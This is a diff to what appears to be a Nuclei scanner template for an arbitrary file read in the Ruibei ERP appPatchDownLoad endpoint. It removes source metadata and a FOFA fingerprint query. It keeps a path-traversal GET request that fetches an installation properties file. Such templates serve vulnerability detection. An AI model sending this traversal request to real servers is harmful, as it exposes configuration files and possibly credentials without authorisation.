@@ -3,14 +3,8 @@ info:
   name: 睿贝外贸ERP appPatchDownLoad 任意文件读取漏洞_ymk6xrz06oiq1396
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,unknown
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ''
-    fofa: body="loginNeedMobileNumVerification" || body="睿贝软件"
 http:
 - raw:
   - 'GET /appPatchDownLoad?fileName=../../../../RebeeCRM/_RebeeCRM_installation/installvariables.properties HTTP/1.1
